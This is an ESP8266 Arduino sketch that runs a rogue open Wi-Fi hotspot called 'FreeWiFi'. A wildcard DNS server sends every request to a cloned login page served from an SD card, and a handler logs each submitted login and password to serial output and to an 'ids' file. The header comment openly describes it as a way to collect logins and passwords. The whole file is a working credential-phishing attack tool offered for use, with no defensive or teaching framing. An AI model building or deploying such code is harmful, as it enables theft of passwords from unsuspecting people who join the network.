/*
  Website to ino generator
  1) Send this code into the ESP8266
  2) Copy the files in the "site" directory into the root directory of the SD card
  3) Wait. You can listen to Serial port to see requests and login/passwords
  4) Login/passwords are stored in the "ids" file on the SD card
*/

#include <ESP8266WiFi.h>
#include "./DNSServer.h"  // Patched lib
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <SD.h>

const byte        DNS_PORT = 53;          // Capture DNS requests on port 53
IPAddress         apIP(10, 10, 10, 1);    // Private network for server
DNSServer         dnsServer;              // Create the DNS object
ESP8266WebServer  webServer(80);          // HTTP server
const int chipSelect = 4;                 // pin D8 on esp8266

String bg1gifContent="";
String abojpgContent="";
String indexhtmlContent="";
String logo2pngContent="";
String bg3gifContent="";
String smallcssContent="";
String bggpngContent="";

void setup()
{
  Serial.begin(9600);

  /////////////
  // SD CARD //
  /////////////

  Serial.print("\nInitializing SD card... ");
  if(!SD.begin(chipSelect))
  {
    Serial.println("initialization failed");
  }
  else
  {
    Serial.println("OK");
  }

  ////////////////////////
  // READ LOCAL WEBSITE //
  ////////////////////////

  File indexhtmlFile = SD.open("f7d5e82c");
  if (indexhtmlFile)
  {
    while (indexhtmlFile.available())
    {
      char ltr = indexhtmlFile.read();
      indexhtmlContent += ltr;
    }
    indexhtmlFile.close();
    Serial.println("./index.html OK");
  }
  else
  {
    Serial.println("Error opening the file ./index.html");
  }


  File bg3gifFile = SD.open("53940479");
  if (bg3gifFile)
  {
    while (bg3gifFile.available())
    {
      char ltr = bg3gifFile.read();
      bg3gifContent += ltr;
    }
    bg3gifFile.close();
    Serial.println("./im/bg3.gif OK");
  }
  else
  {
    Serial.println("Error opening the file ./im/bg3.gif");
  }


  File bg1gifFile = SD.open("4c398f18");
  if (bg1gifFile)
  {
    while (bg1gifFile.available())
    {
      char ltr = bg1gifFile.read();
      bg1gifContent += ltr;
    }
    bg1gifFile.close();
    Serial.println("./im/bg1.gif OK");
  }
  else
  {
    Serial.println("Error opening the file ./im/bg1.gif");
  }


  File abojpgFile = SD.open("97dec7de");
  if (abojpgFile)
  {
    while (abojpgFile.available())
    {
      char ltr = abojpgFile.read();
      abojpgContent += ltr;
    }
    abojpgFile.close();
    Serial.println("./im/abo.jpg OK");
  }
  else
  {
    Serial.println("Error opening the file ./im/abo.jpg");
  }


  File logo2pngFile = SD.open("a6b95e6e");
  if (logo2pngFile)
  {
    while (logo2pngFile.available())
    {
      char ltr = logo2pngFile.read();
      logo2pngContent += ltr;
    }
    logo2pngFile.close();
    Serial.println("./im/logo2.png OK");
  }
  else
  {
    Serial.println("Error opening the file ./im/logo2.png");
  }


  File bggpngFile = SD.open("ed4a6b3c");
  if (bggpngFile)
  {
    while (bggpngFile.available())
    {
      char ltr = bggpngFile.read();
      bggpngContent += ltr;
    }
    bggpngFile.close();
    Serial.println("./im/bgg.png OK");
  }
  else
  {
    Serial.println("Error opening the file ./im/bgg.png");
  }


  File smallcssFile = SD.open("0e5e690d");
  if (smallcssFile)
  {
    while (smallcssFile.available())
    {
      char ltr = smallcssFile.read();
      smallcssContent += ltr;
    }
    smallcssFile.close();
    Serial.println("./css/small.css OK");
  }
  else
  {
    Serial.println("Error opening the file ./css/small.css");
  }


  //////////
  // WIFI //
  //////////

  Serial.print("Initializing Wifi... ");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("FreeWiFi");

  dnsServer.start(DNS_PORT, "*", apIP);

  // Authentication page
  webServer.on("/Auth", handle_Requests);


  webServer.on("../im/bg1.gif", []() {webServer.send(200, "image/gif", bg1gifContent);});
  webServer.on("/im/abo.jpg", []() {webServer.send(200, "image/jpeg", abojpgContent);});
  webServer.onNotFound([]() {webServer.send(200, "text/html", indexhtmlContent); }); // Login page
  webServer.on("/im/logo2.png", []() {webServer.send(200, "image/png", logo2pngContent);});
  webServer.on("../im/bg3.gif", []() {webServer.send(200, "image/gif", bg3gifContent);});
  webServer.on("/css/small.css", []() {webServer.send(200, "text/css", smallcssContent);});
  webServer.on("../im/bgg.png", []() {webServer.send(200, "image/png", bggpngContent);});


  webServer.begin();

  Serial.println("OK");

}

void handle_Requests()
{
  delay(1000);
  String login = webServer.arg("login");
  String password = webServer.arg("password");
  Serial.println("Login/Password: " + login + "/" + password);
  File idsFile = SD.open("ids", FILE_WRITE);
  if (idsFile)
  {
    idsFile.println("Login/Password: " + login + "/" + password);
    idsFile.close();
  }
  else
  {
    Serial.println("Error opening ids");
  }
  webServer.send(404, "text/plain", "");
}

void loop()
{
  dnsServer.processNextRequest();
  webServer.handleClient();
}
